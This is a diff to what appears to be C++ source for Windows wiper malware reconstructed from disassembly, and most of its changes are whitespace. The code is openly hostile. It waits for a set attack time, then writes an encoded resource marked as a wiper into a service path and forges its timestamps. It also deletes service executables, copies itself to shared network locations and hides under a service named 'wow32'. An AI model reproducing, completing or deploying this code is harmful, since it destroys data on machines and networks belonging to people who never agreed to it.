@@ -28,15 +28,15 @@ using namespace sc::service;
 //std::basic_ios<char> byte_41E2E0;
 
 bool LaunchAttack()
-{	
+{
 	char *v12; // [sp+C8h] [bp-218h]@1
 	WCHAR svc_path[250]; // [sp+D0h] [bp-210h]@4
-	
+
 	v12 = ATT_RANDOM;
-	
+
 	/** ----->> TODO: Understand what kind of std:: class is <<----- **/
 	//std::vector<> v9(byte_41E2E0);
-	
+
 	/** ----->> TODO: Check this part <<----- **/
 	/*std::ofstream v6("c:\\windows\\temp\\out17626867.txt");
 	if(v6.is_open())
@@ -52,13 +52,13 @@ bool LaunchAttack()
 	{
 		if(!GetRandomServiceInfo(g_svc_name, svc_path))
 			return false;
-		
+
 		if(!WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)) // Wiper
 		{
 			Exploit();
 			return true;
 		}
-		
+
 		SetReliableFileTime(svc_path);
 
 		g_svc_id = 0;
@@ -66,15 +66,15 @@ bool LaunchAttack()
 		{
 			Exploit();
 		}
-		
-		
+
+
 		return true;
 	}
 	else
 	{
 		Exploit();
 	}
-	
+
 	return false;
 }
 
@@ -89,11 +89,11 @@ inline bool Exploit()
 	else
 	{
 		char *v5 = new char[25];
-		
+
 		memset(v5, 64, 20);
 		/** ----->> TODO: Understand what kind of std:: class is <<----- **/
 		//sub_404D73(byte_41E2E0, v5, 18, 0);
-		
+
 		if(v5) delete [] v5;
 	}
 }
@@ -106,10 +106,10 @@ bool Run(BOOL is_service_running)
 	if(is_service_running == TRUE)
 	{
 		g_ready_to_attack = false;
-		
+
 		InitializeCriticalSection(&g_critical_section);
 		SvcSleep(GetRandom() % 60 + 60);
-		
+
 		hObject = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunServiceNetinit, NULL, 0, NULL);
 		if(!bSvcStopped)
 		{
@@ -118,15 +118,15 @@ bool Run(BOOL is_service_running)
 				EnterCriticalSection(&g_critical_section);
 				DeleteServiceExecutables();
 				LeaveCriticalSection(&g_critical_section);
-				
+
 				if(g_ready_to_attack || (time_to_attack = TimeToAttack()) == 0)
 				{
 					g_ready_to_attack = true;
-					
+
 					EnterCriticalSection(&g_critical_section);
 					LaunchAttack();
 					LeaveCriticalSection(&g_critical_section);
-					
+
 					SvcSleep(GetRandom() % 60 + 120);
 				}
 				else
@@ -137,43 +137,38 @@ bool Run(BOOL is_service_running)
 			}
 			while(!bSvcStopped);
 		}
-		
+
 		// Wait until the netinit function end
 		if(hObject != NULL)
 		{
 			WaitForSingleObject(hObject, WAIT_FAILED);
 			CloseHandle(hObject);
 		}
-		
+
 		DeleteCriticalSection(&g_critical_section);
 		return true;
 	}
-	
+
 	if(g_argc <= 1)
 		return CopyCurrentExecutableToTrkSvr();
-	
+
 	return (strlenW(g_argv[1]) == 1) ? WriteModuleOnSharedNetwork() : WriteModuleOnSharedPCByArgv();
 }
 
 int main(int argc, const char **argv, const char **envp)
 {
 	SERVICE_TABLE_ENTRYW ServiceStartTable; // [sp+4h] [bp-10h]@3
-	int v5; // [sp+Ch] [bp-8h]@3
-	int v6; // [sp+10h] [bp-4h]@3
 
 	GeneralSetup();
 	if(SetupTrkSvrService())
 		exit(0);
-	
-	v5 = 0;
-	v6 = 0;
-	
+
+	// Start a service named "wow32" that's really our service
 	ServiceStartTable.lpServiceName = (LPWSTR)L"wow32";
 	ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)SvcMain;
-	
 	if(!StartServiceCtrlDispatcherW(&ServiceStartTable))
 		Run(FALSE);
-	
+
 	ResetArgs();
 	return 0;
 }
